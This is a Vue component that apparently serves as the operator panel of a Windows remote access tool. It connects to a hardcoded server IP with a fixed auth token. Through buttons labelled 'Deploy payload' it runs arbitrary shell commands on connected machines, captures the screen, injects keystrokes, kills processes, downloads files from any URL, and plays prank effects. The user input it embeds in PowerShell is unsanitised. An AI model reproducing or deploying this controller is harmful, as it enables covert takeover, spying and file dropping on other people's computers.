<template>
  <div class="deviceControlContainer">
    <div class = "connectedListTitle">
      <h2>
        {{ deviceData.isConnected === true ? "Connected to: " : "Disconnected from: " }}
        <b>{{ deviceData.name }}</b>
      </h2>
    </div>

    <div class = "mainContainerPicker">
      <div class = "devicePicker">
        <div
          class = "deviceCard"
          v-for="controlOptions in controlFunctions"
          :key="controlOptions.functionName"
          v-bind:class = "[
            controlOptions.requiresInput ? controlOptions.inputAmounts && controlOptions.inputAmounts > 1 ? 'expandCard-2' : 'expandCard-2' : '',
            controlOptions.enabled && controlOptions.function ? 'isHoverBlue' : 'isHoverRed'
          ]"
        >
          <div
            v-bind:class = "[controlOptions.enabled && controlOptions.function ? 'onlineTransform' : 'offlineTransform']"
          >

            <div v-if = "controlOptions.requiresInput" class = "inputContainer">
              <template v-if="controlOptions.enabled">
                <template v-if="controlOptions.inputAmounts > 1">
                  <textarea
                    class = "dualTextarea"
                    v-bind:placeholder = "controlOptions.placeHolderPrimary"
                    v-bind:value = "nessescaryFunctions.Store.getItem(controlOptions.functionName + '_PRIMARY')"
                  ></textarea>
                  <textarea
                    class = "dualTextarea"
                    v-bind:placeholder = "controlOptions.placeHolderSecondary"
                    v-bind:value = "nessescaryFunctions.Store.getItem(controlOptions.functionName + '_SECONDARY')"
                  ></textarea>
                </template>
                <template v-else>
                  <textarea
                    class = "singleTextarea"
                    v-bind:placeholder = "controlOptions.placeHolder"
                    v-bind:value = "nessescaryFunctions.Store.getItem(controlOptions.functionName)"
                  ></textarea>
                </template>
              </template>
              <template v-else>
                <i class="material-icons">
                  cloud_off
                </i>
              </template>
            </div>

            <div
              class = "mainContent"
              v-on:click = "prepareExecution(controlOptions, $event)"
            >
              <div>
                <h3><span style = "opacity: 0.5">REQUIRES INPUT · </span>{{ controlOptions.placeHolder ? 'TRUE' : 'FALSE'}}</h3>
                <h1>{{ controlOptions.functionName }}</h1>
                <h2><span style = "opacity: 0.5">OS · </span>Windows</h2>
              </div>
            </div>

            <div
              class = "statisticContent"
              v-on:click = "prepareExecution(controlOptions, $event)"
            >
              <div class = "profilePicture">
                <i class="material-icons icon">{{ controlOptions.enabled && controlOptions.function ? 'chevron_right' : 'close' }}</i>
              </div>
              <div class = "userInformation">
                <h3>Deploy payload</h3>
                <h4>Is internal: <span>{{ (controlOptions.isInternal ? 'true' : 'false').toUpperCase() }}</span></h4>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
import animateElements from "animejs";
import { EventBus } from "../eventBus.js";
import SocketsIO from "socket.io-client";
import vueAlert from "sweetalert";
import codemirror from "codemirror";
import "codemirror/lib/codemirror.css";
import "codemirror/theme/monokai.css";
import Keyboard from "simple-keyboard";
import "simple-keyboard/build/css/index.css";

export default {
  name: "controlFunctions",
  props: {
    mainTitleDelay: {
      type: Number,
      required: false,
      default: 500
    },
    secondaryDurations: {
      type: Number,
      required: false,
      default: 500
    },
    initialTransformX: {
      type: String,
      required: false,
      default: "50px"
    },
    finalTransformX: {
      type: String,
      required: false,
      default: "0px"
    },
    renderedOpacity: {
      type: Number,
      required: false,
      default: 1
    }
  },
  mounted: function() {
    this.realTimeAllocation();

    EventBus.$on("initiateController", computerName => {
      this.LoadControls(computerName);
    });

    EventBus.$on("connectedClients", parsedData => {
      this.userData = parsedData;
    });
    //[...this.$el.getElementsByTagName("textarea")].map(element => this.createCodebox(element))

    let vm = this;

    this._data.socketData.CurrentSocket.on("codeExecutionResponse", function(
      data
    ) {
      if (data.uniqueRoomNumber === vm._data.socketData.computerName) {
        vm.gotResponse = true;
        vm.$Progress.finish();

        [...document.getElementsByClassName("CodeMirror")].map(element =>
          element.remove()
        );

        if (data.error) {
          new Notification("Error: Failed to run shell command", {
            body: "See browserwindow for logs",
            icon: "https://suraj.codes/dist/OrionAssets/icon.png"
          });

          let ERROR = data.error ? data.error.replace(/\r?\n/g, "\n\r") : "Couldn't serilize"

          let codeElement = document.createElement("textarea");
          codeElement.innerHTML = `ERROR:\n${ERROR}`;
          document.body.appendChild(codeElement);

          codemirror.fromTextArea(codeElement, {
            lineNumbers: true,
            theme: "monokai"
          });

          let codeMirrorElement = document.getElementsByClassName(
            "CodeMirror"
          )[0];
          codeMirrorElement.style.textAlign = "left";

          vueAlert({
            content: codeMirrorElement
          });

          let swalModal = document.getElementsByClassName("swal-modal")[0];
          swalModal.style.backgroundColor = "#e74c3c";

          let codeMirrorGutter = document.getElementsByClassName(
            "CodeMirror-gutters"
          )[0];
          codeMirrorGutter.style.backgroundColor = "#e74c3c";

          let codeMirrorWindow = document.getElementsByClassName(
            "CodeMirror"
          )[0];
          codeMirrorWindow.style.backgroundColor = "#e74c3c";
        } else {
          new Notification("Success: Ran shell command", {
            body: "See browserwindow for logs",
            icon: "https://suraj.codes/dist/OrionAssets/icon.png"
          });
          if (data.stdout === "" && data.stderr === "") return;

          if (data.stdout.search("Called: viewScreen") > -1){
            let imageElement = document.createElement("img");
            imageElement.src = data.stderr
            document.body.appendChild(imageElement);

            return vueAlert({
              content: imageElement
            });
          }

          let STDOUT = data.stdout ? data.stdout.replace(/\r?\n/g, "\n\r") : "Couldn't serilize"
          let STDERR = data.stderr ? data.stderr.replace(/\r?\n/g, "\n\r") : "Couldn't serilize"

          let codeElement = document.createElement("textarea");
          codeElement.innerHTML = `STDOUT:\n${STDOUT}\n\nSTDERR:\n${STDERR}`;
          document.body.appendChild(codeElement);

          codemirror.fromTextArea(codeElement, {
            lineNumbers: true,
            theme: "monokai"
          });

          let codeMirrorElement = document.getElementsByClassName(
            "CodeMirror"
          )[0];
          codeMirrorElement.style.textAlign = "left";

          vueAlert({
            content: codeMirrorElement
          });

          let swalModal = document.getElementsByClassName("swal-modal")[0];
          swalModal.style.backgroundColor = "#272822";
        }
      }
    });
  },
  methods: {
    createCodebox: function(codeElement){
      return codemirror.fromTextArea(codeElement, {
        lineNumbers: true,
        theme: "monokai"
      });
    },
    realTimeAllocation: function() {
      this._data.socketData.CurrentSocket.on(
        "DisconnectionFromClient",
        uniqueIdentifier => {
          if (!uniqueIdentifier || uniqueIdentifier === null) return;

          for (let userInformation of this.userData) {
            if (userInformation.computerName === this.socketData.computerName) {
              this.controlFunctions.map(data => (data.enabled = false));
              this.deviceData.isConnected = false;
            }
          }
        }
      );
    },
    prepareExecution: function(identifier, eventElement) {
      if (!identifier.enabled) return;
      let deviceCard = eventElement.target.closest('.deviceCard')
      let requiresInput = eventElement.target.closest('.deviceCard').getElementsByTagName("div")[0].getElementsByClassName("inputContainer").length > 0 ? true : false

      if (requiresInput) {
        let inputContainer = eventElement.target.closest('.deviceCard').getElementsByTagName("div")[0].getElementsByClassName("inputContainer")[0]
        if (
          inputContainer.getElementsByTagName("textarea").length > 1
        ) {
          let primaryInput = inputContainer.getElementsByTagName("textarea")[0].value;
          let secondaryInput = inputContainer.getElementsByTagName("textarea")[1].value;

          console.log(primaryInput, secondaryInput)

          if (primaryInput !== "" || secondaryInput !== "") {
            this._data.nessescaryFunctions.Store.setItem(
              identifier.functionName + "_PRIMARY",
              primaryInput
            );

            this._data.nessescaryFunctions.Store.setItem(
              identifier.functionName + "_SECONDARY",
              secondaryInput
            );

            this.gotResponse = false;
            this.$Progress.start();
            setTimeout(
              function() {
                if (this.gotResponse === false) this.$Progress.fail();
              }.bind(this),
              5000
            );
            identifier.function(this, primaryInput, secondaryInput);
          } else {
            new Notification("Failed to call designated function", {
              body: "Input can not be blank"
            });
          }
        } else {
          let userInput = inputContainer.getElementsByTagName("textarea")[0].value;
          if (userInput !== "") {
            this._data.nessescaryFunctions.Store.setItem(
              identifier.functionName,
              userInput
            );
            this.gotResponse = false;
            this.$Progress.start();
            setTimeout(
              function() {
                if (this.gotResponse === false) this.$Progress.fail();
              }.bind(this),
              5000
            );
            identifier.function(this, userInput);
          } else {
            new Notification("Failed to call designated function", {
              body: "Input can not be blank"
            });
          }
        }
      } else {
        this.gotResponse = false;
        this.$Progress.start();
        setTimeout(
          function() {
            if (this.gotResponse === false) this.$Progress.fail();
          }.bind(this),
          5000
        );
        identifier.function(this);
      }
    },
    LoadControls: function(computerName) {
      let divElement = this.$el;

      let configData = {
        primaryTitle: divElement
          .getElementsByClassName("connectedListTitle")[0]
          .getElementsByTagName("h2")[0],

        deviceCards: divElement
          .getElementsByClassName("mainContainerPicker")[0]
          .getElementsByClassName("devicePicker")[0]
          .getElementsByClassName("deviceCard"),
        props: this._props
      };

      divElement.style.zIndex = "5";

      this.deviceData.isConnected = true;
      this.deviceData.name = computerName;
      this.socketData.computerName = computerName;

      animateElements({
        targets: configData.primaryTitle,
        delay: configData.props.mainTitleDelay,
        opacity: configData.props.renderedOpacity,
        duration: configData.props.secondaryDurations / 2,
        translateX: [
          configData.props.initialTransformX,
          configData.props.finalTransformX
        ],
        easing: "easeOutCubic",
        begin: () =>
          animateElements({
            targets: configData.deviceCards,
            opacity: configData.props.renderedOpacity,
            duration: configData.props.secondaryDurations / 2,
            delay: function(_, currentKeyframe) {
              return (
                (currentKeyframe * configData.props.secondaryDurations) / 10
              );
            }
          })
      });
    }
  },
  data: () => {
    return {
      socketData: {
        CurrentSocket: SocketsIO("http://139.59.200.147:4001/")
      },
      deviceData: {
        isConnected: false,
        name: "<< AWAITING CONNECTION >>"
      },
      nessescaryFunctions: {
        Store: window.localStorage
      },
      isKeyboardActive: false,
      controlFunctions: [
        {
          functionName: "Execute shell",
          requiresInput: true,
          placeHolder: "echo 'Hello world'",
          enabled: true,
          function: function(vm, shellCommand) {
            return vm.socketData.CurrentSocket.emit("transmitToClients", {
              auth: "B3GHU8",
              computerName: vm.socketData.computerName,
              functionName: this.functionName,
              internalCall: {
                isShell: true,
                Data: shellCommand
              }
            });
          }
        },
        {
          functionName: "Shutdown",
          requiresInput: false,
          enabled: true,
          function(vm) {
            let shellCommand = `Stop-Computer`;

            return vm.socketData.CurrentSocket.emit("transmitToClients", {
              auth: "B3GHU8",
              computerName: vm.socketData.computerName,
              functionName: this.functionName,
              internalCall: {
                isShell: true,
                Data: shellCommand
              }
            });
          }
        },
        {
          functionName: "Restart",
          requiresInput: false,
          enabled: true,
          function(vm) {
            let shellCommand = `Restart-Computer`;

            return vm.socketData.CurrentSocket.emit("transmitToClients", {
              auth: "B3GHU8",
              computerName: vm.socketData.computerName,
              functionName: this.functionName,
              internalCall: {
                isShell: true,
                Data: shellCommand
              }
            });
          }
        },
        {
          functionName: "Max volume",
          requiresInput: false,
          enabled: true,
          function(vm) {
            let shellCommand = `
              $obj = new-object -com wscript.shell
              For ($i = 0; $i -lt 50; $i++){
                $obj.SendKeys([char]175)
                sleep 0.01
              }
            `;

            return vm.socketData.CurrentSocket.emit("transmitToClients", {
              auth: "B3GHU8",
              computerName: vm.socketData.computerName,
              functionName: this.functionName,
              internalCall: {
                isShell: true,
                Data: shellCommand
              }
            });
          }
        },
        {
          functionName: "Mute volume",
          requiresInput: false,
          enabled: true,
          function(vm) {
            let shellCommand = `
              $obj = new-object -com wscript.shell
              For ($i = 0; $i -lt 50; $i++){
                $obj.SendKeys([char]174)
                sleep 0.01
              }
            `;

            return vm.socketData.CurrentSocket.emit("transmitToClients", {
              auth: "B3GHU8",
              computerName: vm.socketData.computerName,
              functionName: this.functionName,
              internalCall: {
                isShell: true,
                Data: shellCommand
              }
            });
          }
        },
        {
          functionName: "Change background",
          requiresInput: true,
          placeHolder: "URL",
          enabled: true,
          isInternal: true,
          function(vm, URL) {
            return vm.socketData.CurrentSocket.emit("transmitToClients", {
              auth: "B3GHU8",
              computerName: vm.socketData.computerName,
              functionName: this.functionName,
              internalCall: {
                isNode: true,
                Function: "ChangeBackground",
                Data: URL
              }
            });
          }
        },
        {
          functionName: "Open URL",
          requiresInput: true,
          placeHolder: "URL",
          enabled: true,
          function(vm, URL) {
            let shellCommand = `start ${URL}`;

            return vm.socketData.CurrentSocket.emit("transmitToClients", {
              auth: "B3GHU8",
              computerName: vm.socketData.computerName,
              functionName: this.functionName,
              internalCall: {
                isShell: true,
                Data: shellCommand
              }
            });
          }
        },
        {
          functionName: "Show apps",
          requiresInput: false,
          enabled: true,
          function(vm) {
            let shellCommand = `gps | ? {$_.mainwindowhandle -ne 0} | select name, mainwindowtitle`;

            return vm.socketData.CurrentSocket.emit("transmitToClients", {
              auth: "B3GHU8",
              computerName: vm.socketData.computerName,
              functionName: this.functionName,
              internalCall: {
                isShell: true,
                Data: shellCommand
              }
            });
          }
        },
        {
          functionName: "View screen",
          requiresInput: false,
          enabled: true,
          function(vm) {

            return vm.socketData.CurrentSocket.emit("transmitToClients", {
              auth: "B3GHU8",
              computerName: vm.socketData.computerName,
              functionName: this.functionName,
              internalCall: {
                isNode: true,
                Function: "viewScreen",
                Data: "N/A"
              }
            });
          }
        },
        {
          functionName: "Open disk drive",
          requiresInput: false,
          enabled: true,
          function(vm) {
            let shellCommand = `$sh = New-Object -ComObject "Shell.Application"
            $sh.Namespace(17).Items() |  Where-Object { $.Type -eq "CD Drive" } | foreach { $.InvokeVerb("Eject") }`;
            return vm.socketData.CurrentSocket.emit("transmitToClients", {
              auth: "B3GHU8",
              computerName: vm.socketData.computerName,
              functionName: this.functionName,
              internalCall: {
                isShell: true,
                Data: shellCommand
              }
            })
          }
        },
        {
          functionName: "Keyboard",
          requiresInput: false,
          enabled: true,
          function(vm) {
            let keyBoard = document.createElement("div");
            keyBoard.className = "simple-keyboard";
            document.body.appendChild(keyBoard);

            let onKeyPress = button => {
              if (vm.isKeyboardActive === false) return;

              return vm.socketData.CurrentSocket.emit("transmitToClients", {
                auth: "B3GHU8",
                computerName: vm.socketData.computerName,
                functionName: this.functionName,
                internalCall: {
                  isKeyboard: true,
                  Function: "simulateKeyboard",
                  Data: button
                }
              });
            }

            vm.isKeyboardActive = true;
            vueAlert({
              content: keyBoard
            }).then(closed => {
              vm.isKeyboardActive = false;
            });

            let vueKeyboard = new Keyboard({
              onKeyPress: button => onKeyPress(button),
              physicalKeyboardHighlight: true
            });
          }
        },
        {
          functionName: "Kill application",
          requiresInput: true,
          placeHolder: "chrome",
          enabled: true,
          function(vm, NAME) {
            let shellCommand = `Stop-Process -Name "${NAME}" -force`;
            return vm.socketData.CurrentSocket.emit("transmitToClients", {
              auth: "B3GHU8",
              computerName: vm.socketData.computerName,
              functionName: this.functionName,
              internalCall: {
                isShell: true,
                Data: shellCommand
              }
            });
          }
        },
        {
          functionName: "Set profile picture",
          requiresInput: true,
          placeHolder: "URL",
          enabled: false
        },
        {
          functionName: "Minimize windows",
          requiresInput: false,
          enabled: true,
          function(vm, PATH) {
            let shellCommand = `$shell = New-Object -ComObject "Shell.Application"
            $shell.minimizeall()
            echo Minimized all windows`;
            return vm.socketData.CurrentSocket.emit("transmitToClients", {
              auth: "B3GHU8",
              computerName: vm.socketData.computerName,
              functionName: this.functionName,
              internalCall: {
                isShell: true,
                Data: shellCommand
              }
            })
          }
        },
        {
          functionName: "Send notification",
          requiresInput: true,
          placeHolder: "Hello World",
          enabled: true,
          function(vm, CONTENT) {
            let shellCommand = `Add-Type -AssemblyName System.Windows.Forms
            $global:balloon = New-Object System.Windows.Forms.NotifyIcon
            $path = (Get-Process -id $pid).Path
            $balloon.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)
            $balloon.BalloonTipIcon = [System.Windows.Forms.ToolTipIcon]::Warning
            $balloon.BalloonTipText = '${CONTENT}?'
            $balloon.BalloonTipTitle = "Attention $Env:USERNAME"
            $balloon.Visible = $true
            $balloon.ShowBalloonTip(5000)`;
            return vm.socketData.CurrentSocket.emit("transmitToClients", {
              auth: "B3GHU8",
              computerName: vm.socketData.computerName,
              functionName: this.functionName,
              internalCall: {
                isShell: true,
                Data: shellCommand
              }
            });
          }
        },
        {
          functionName: "Speech synthesis",
          requiresInput: true,
          placeHolder: "Hello World",
          enabled: true,
          function(vm, CONTENT) {
            let shellCommand = `Add-Type -AssemblyName System.speech
            $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer
            $speak.Speak("${CONTENT}")`;
            return vm.socketData.CurrentSocket.emit("transmitToClients", {
              auth: "B3GHU8",
              computerName: vm.socketData.computerName,
              functionName: this.functionName,
              internalCall: {
                isShell: true,
                Data: shellCommand
              }
            });
          }
        },
        {
          functionName: "Play beeper",
          requiresInput: true,
          inputAmounts: 2,

          placeHolderPrimary: "Pitch",
          placeHolderSecondary: "Duration",

          enabled: true,
          function: function(vm, Pitch, Duration) {
            let shellCommand = `
            $obj = new-object -com wscript.shell
            For ($i = 0; $i -lt 50; $i++){
              $obj.SendKeys([char]175)
              sleep 0.01
            };

            [console]::beep(${Pitch}, ${Duration})
            `;

            return vm.socketData.CurrentSocket.emit("transmitToClients", {
              auth: "B3GHU8",
              computerName: vm.socketData.computerName,
              functionName: this.functionName,
              internalCall: {
                isShell: true,
                Data: shellCommand
              }
            });
          }
        },
        {
          functionName: "Download file",
          requiresInput: true,
          inputAmounts: 2,

          placeHolderPrimary: "URL",
          placeHolderSecondary: "Path",

          enabled: true,
          function: function(vm, URL, PATH) {
            let shellCommand = `
            $url = "${URL}"
            $output = "${PATH}"
            $start_time = Get-Date

            Import-Module BitsTransfer
            Start-BitsTransfer -Source $url -Destination $output

            Write-Output "Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)"
            `;

            return vm.socketData.CurrentSocket.emit("transmitToClients", {
              auth: "B3GHU8",
              computerName: vm.socketData.computerName,
              functionName: this.functionName,
              internalCall: {
                isShell: true,
                Data: shellCommand
              }
            });
          }
        },
        {
          functionName: "Open file",
          requiresInput: true,
          placeHolder: "Path",
          enabled: true,
          function(vm, PATH) {
            let shellCommand = `Invoke-Item ${PATH};
            echo Opened file: ${PATH}`;
            return vm.socketData.CurrentSocket.emit("transmitToClients", {
              auth: "B3GHU8",
              computerName: vm.socketData.computerName,
              functionName: this.functionName,
              internalCall: {
                isShell: true,
                Data: shellCommand
              }
            });
          }
        },
        {
          functionName: "Whois",
          requiresInput: true,
          placeHolder: "Path",
          enabled: false,
          function(vm, PATH) {
            let shellCommand = `function Get-LoggedOnUser
            {
                [CmdletBinding()]
                param
                (
                    [Parameter()]
                    [ValidateScript({ Test-Connection -ComputerName $_ -Quiet -Count 1 })]
                    [ValidateNotNullOrEmpty()]
                    [string[]]$ComputerName = $env:COMPUTERNAME
                )
                foreach ($comp in $ComputerName)
                {
                    $output = @{ 'ComputerName' = $comp }
                    $output.UserName = (Get-WmiObject -Class win32_computersystem -ComputerName $comp).UserName
                    [PSCustomObject]$output
                }
            }
            Get-LoggedOnUser

            Get-ADDomain -Current LoggedOnUser
            Get-ADDomain -Current LocalComputer`;
            return vm.socketData.CurrentSocket.emit("transmitToClients", {
              auth: "B3GHU8",
              computerName: vm.socketData.computerName,
              functionName: this.functionName,
              internalCall: {
                isShell: true,
                Data: shellCommand
              }
            });
          }
        }
      ]
    };
  }
};
</script>

<style scoped lang="stylus">
  @import "./constants.styl"
  @import url('https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700,800')

  replicateGrid(pushedColour, pushedWidth)
    .mainContent
      border-radius: 15px
      padding-top: 10px
      padding-left: 18px
      max-height: 125px
      background: white

      h1, h2, h3, h4
        font-family: 'Open Sans', sans-serif
        margin-top: 9px
        margin-bottom: @margin-top

      h3
        font-size: 1em
        color: #2f3640
        font-weight: 700

      h1
        font-size: 1.3em
        color: #2f3640
        font-weight: 700

      h2
        font-size: 1em
        font-weight: 600
        color: #212121

    .inputContainer
      background: pushedColour;
      float: right;
      height: 233px;
      width: 400px;
      border-radius: 0px 15px 15px 0px

      .material-icons
        opacity: 0.7
        font-size: 10em
        color: white
        padding-left: 27%
        padding-top: 9%

      .dualTextarea
        background-color: lighten(pushedColour, 10%)
        color: white
        padding: 3%
        margin-left: 3%
        width: 88%
        height: 35%
        border: 0
        font-size: 1.5em;
        transition: all 0.5s
        resize: none
        overflow: hidden

        &:nth-child(1)
          border-radius: 0px 15px 0px 0px
          margin-top: 2%

        &:nth-child(2)
          border-radius: 0px 0px 15px 0px

        &::placeholder
          color: white

      .singleTextarea
        background-color: lighten(pushedColour, 10%)
        color: white
        border: 0
        border-radius: 0px 15px 15px 0px
        padding: 3%
        margin: 3%
        width: 88%
        height: 80%
        font-size: 1.5em;
        transition: all 0.5s
        resize: none
        overflow: hidden

        &::placeholder
          color: white

    .statisticContent
        height: 100px
        display: flex

        .profilePicture
            padding-top: 15px
            padding-left: 15px

            .icon
              font-size: 3em
              padding: 2px
              color: white
              background-color: pushedColour
              border-radius: 50%

            img
              width: 60px
              border-radius: 50%

         .userInformation
           padding-left: 18px
           padding-top: 15px

           h1, h2, h3, h4
            font-family: 'Open Sans', sans-serif
            margin-top: 4px
            margin-bottom: @margin-top

           h3
             font-weight: 600
             color: pushedColour
             text-transform: uppercase

           h4
             color: lighten(#57606f, 10%)
             font-weight: 600

             span
               font-weight: 700
               color: black

  .connectedClientContainer
    position: absolute
    height: 100%
    width: 100%
    z-index: -5
    display: grid
    height: 100%
    grid-template-columns: 100%
    grid-template-rows: 50px 1fr
    grid-gap: 20px 20px

    .connectedListTitle
      text-align: center
      display: flex;
      justify-content: center

      h2
        font-family: 'Montserrat', sans-serif
        text-transform: uppercase
        color: lighten($colourConst.ShadeY.Primary, 15%)
        font-weight: 300
        opacity: 0
        align-self: center;

        b
          font-weight: 700

/////////////////////////////////////////
.deviceControlContainer
  position: absolute
  height: 100%
  width: 100%
  z-index: -5
  display: grid
  height: 100%
  grid-template-columns: 100%
  grid-template-rows: 50px 1fr
  grid-gap: 20px 20px

  .connectedListTitle
    text-align: center

    h2
      font-family: 'Montserrat', sans-serif
      text-transform: uppercase
      color: lighten($colourConst.ShadeY.Primary, 15%)
      mix-blend-mode: difference
      font-weight: 300
      opacity: 0

      b
        font-weight: 700

  .mainContainerPicker
    overflow: scroll
    padding: 50px

    .devicePicker
      display: grid
      align-self: center
      justify-content: center
      grid-template-columns: repeat(auto-fill, 350px)
      grid-auto-rows: 237px
      grid-gap: 65px 65px

      .expandCard-2
        grid-column: auto / span 2;

      .deviceCard
        opacity: 0
        border-radius: 15px
        grid-column-start: auto
        grid-row-start: auto
        border: 2px solid darken(white, 5%)
        transition: all 0.25s
        background: white
        display: grid
        grid-template-columns: 1fr
        grid-template-rows: 1fr 1fr 1fr
        box-shadow: 0px 7px 20px rgba(0,0,0,0.2)

      .isHoverBlue
        &:hover
          cursor: pointer
          box-shadow: 0px 14px 30px rgba($colourConst.ShadeZ.DarkBlue,0.3)
          transform: translateY(5px)
          transition: box-shadow transform 0.25s

      .offlineTransform
        replicateGrid($colourConst.ShadeZ.LightRed, 294px)

      .onlineTransform
        replicateGrid($colourConst.ShadeZ.DarkBlue, 294px)

      .dangerTransform
        replicateGrid($colourConst.ShadeZ.LightRed, auto)

</style>
